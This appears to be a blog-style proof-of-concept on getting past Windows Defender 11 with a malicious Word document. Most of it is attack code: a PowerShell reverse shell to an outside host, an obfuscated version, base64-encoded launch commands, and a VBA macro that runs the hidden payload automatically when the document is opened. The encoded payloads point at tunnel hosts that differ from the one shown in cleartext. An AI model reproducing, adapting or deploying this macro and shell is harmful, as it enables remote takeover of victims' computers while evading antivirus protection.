## Table of Contents

- [**Outline**](#section-0)
- [**Windows Defender  Explanation**](#section-1)
- [**Word Document VBA Macro**](#section-2)
- [ **Proof of Concept - Bypassing 2023 Windows Defender 11**](#section-3)




## Outline  {#section-0}

The objective of this document is to explore evasion techniques concerning the latest security measures implemented within Windows Defender 11. Specifically, the aim is to execute a reverse shell from a Microsoft Word document. The ultimate goal is to achieve Remote Code Execution (RCE) within the context of NT/Authority System privileges upon opening the malicious Word document.

![](/assets/AV/Final.png)  

# Windows Defender   {#section-1}
Windows Defender 11 is Microsoft's built-in antivirus and antimalware solution. It provides real-time protection against various threats like viruses, ransomware, spyware, and other malicious software. Defender scans files, monitors activities, and offers firewall protection, all to help safeguard your system and data from potential security risks. Additionally, it includes features such as cloud-based protection and regular updates to ensure comprehensive defense against evolving threats.

# Word Document VBA Macro {#section-2}

A Word document VBA macro is a script embedded within a Word document that uses Visual Basic for Applications (VBA) to automate tasks or perform certain functions within the document. Macros can execute commands, manipulate data, or interact with external systems.

In the context of Word document macros, a malicious macro might attempt to establish this reverse shell connection, allowing an attacker to control the compromised system remotely. This is often used as part of cyberattacks to gain unauthorized access or control over a victim's computer.

# Evasion Proof of Concept {#section-3}
<img src="/assets/AV/FinalMacro.gif" width="1500" height="2500"/>
Below are the steps:
```bash
$client = New-Object System.Net.Sockets.TCPClient('legitwebsite.com',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
Now manually applying Obfuscation techniques we get 

```bash

$client = <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit > New-Object Syste''m.Net.Sockets.TCPClient('legitwebsite.com',80); <# Suspendisse korean github   websiteellentesque suscipit #> $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; <# Healthy subject to eat with #>while(($i = $stream.Read($bytes, 0, $bytes.  Length)) -ne 0){;$data = (New-Object -TypeName <# Suspendisse imperdiet lacus eu tellus pellentesque suscipit #> System.Text.ASCIIEncoding).GetString($bytes,0, $i);  $sendback = (ie""x'' $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (gl).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write  ($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() <# aslkd;l l;ka;skd;lkasd dalskd;laksdl;kasdksasdcipit #>  

```
Encoding the powershell with base64.

```bash

powershell.exe -exec bypass -enc IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzACAAJABjAGwAaQBlAG4AdAAgAD0AIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGUAdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlACcAJwBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADgALgB0AGMAcAAuAHUAcwAtAGMAYQBsAC0AMQAuAG4AZwByAG8AawAuAGkAbwAnACwAMQAzADYANAAwACkAOwAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGsAbwByAGUAYQBuACAAZwBpAHQAaAB1AGIAIAB3AGUAYgBzAGkAdABlAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAPAAjACAASABlAGEAbAB0AGgAeQAgAHMAdQBiAGoAZQBjAHQAIAB0AG8AIABlAGEAdAAgAHcAaQB0AGgAIAAjAD4AdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAaQBtAHAAZQByAGQAaQBlAHQAIABsAGEAYwB1AHMAIABlAHUAIAB0AGUAbABsAHUAcwAgAHAAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAIgAiAHgAJwAnACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAZwBsACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAA8ACMAIABhAHMAbABrAGQAOwBsACAAbAA7AGsAYQA7AHMAawBkADsAbABrAGEAcwBkACAAZABhAGwAcwBrAGQAOwBsAGEAawBzAGQAbAA7AGsAYQBzAGQAawBzAGEAcwBkAGMAaQBwAGkAdAAgACMAPgAKAA==

```
Crafting the Payload in Word Document VBA

```bash
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
Dim facebook
facebook = "powershell.exe -nop -w hidden -e IAAkAGMAbABpAGUAbgB0ACAAPQAgADwAIwAgAFMAdQBzAHAAZQBuAGQAaQBzAHMAZQAgAGkAbQBwAGUAcgBkAGkAZQB0ACAAbABhAGMAdQBzACAAZQB1ACAAdABlAGwAbAB1AHM" _
& "AIABwAGUAbABsAGUAbgB0AGUAcwBxAHUAZQAgAHMAdQBzAGMAaQBwAGkAdAAgACMAPgAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAJwAnAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGw" _
& "AaQBlAG4AdAAoACcANAAuAHQAYwBwAC4AdQBzAC0AYwBhAGwALQAxAC4AbgBnAHIAbwBrAC4AaQBvACcALAAxADIAOAA4ADAAKQA7ACAAPAAjACAAUwB1AHMAcABlAG4AZABpAHMAcwBlACAAawBvAHIAZQBhAG4AIABnAGk" _
& "AdABoAHUAYgAgAHcAZQBiAHMAaQB0AGUAZQBsAGwAZQBuAHQAZQBzAHEAdQBlACAAcwB1AHMAYwBpAHAAaQB0ACAAIwA+ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACg" _
& "AKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAA8ACMAIABIAGUAYQBsAHQAaAB5ACAAcwB1AGIAagBlAGMAdAAgAHQAbwAgAGUAYQB0ACAAdwBpAHQ" _
& "AaAAgACMAPgB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHs" _
& "AOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIAA8ACMAIABTAHUAcwBwAGUAbgBkAGkAcwBzAGUAIABpAG0AcABlAHIAZABpAGUAdAAgAGwAYQBjAHUAcwAgAGU" _
& "AdQAgAHQAZQBsAGwAdQBzACAAcABlAGwAbABlAG4AdABlAHMAcQB1AGUAIABzAHUAcwBjAGkAcABpAHQAIAAjAD4AIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGU" _
& "AdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQAiACIAeAAnACcAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHI" _
& "AaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABnAGwAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHk" _
& "AdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQ" _
& "AZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACg" _
& "AKQAgADwAIwAgAGEAcwBsAGsAZAA7AGwAIABsADsAawBhADsAcwBrAGQAOwBsAGsAYQBzAGQAIABkAGEAbABzAGsAZAA7AGwAYQBrAHMAZABsADsAawBhAHMAZABrAHMAYQBzAGQAYwBpAHAAaQB0ACAAIwA+AA=="
Call Shell(facebook, vbHide)
End Sub
```



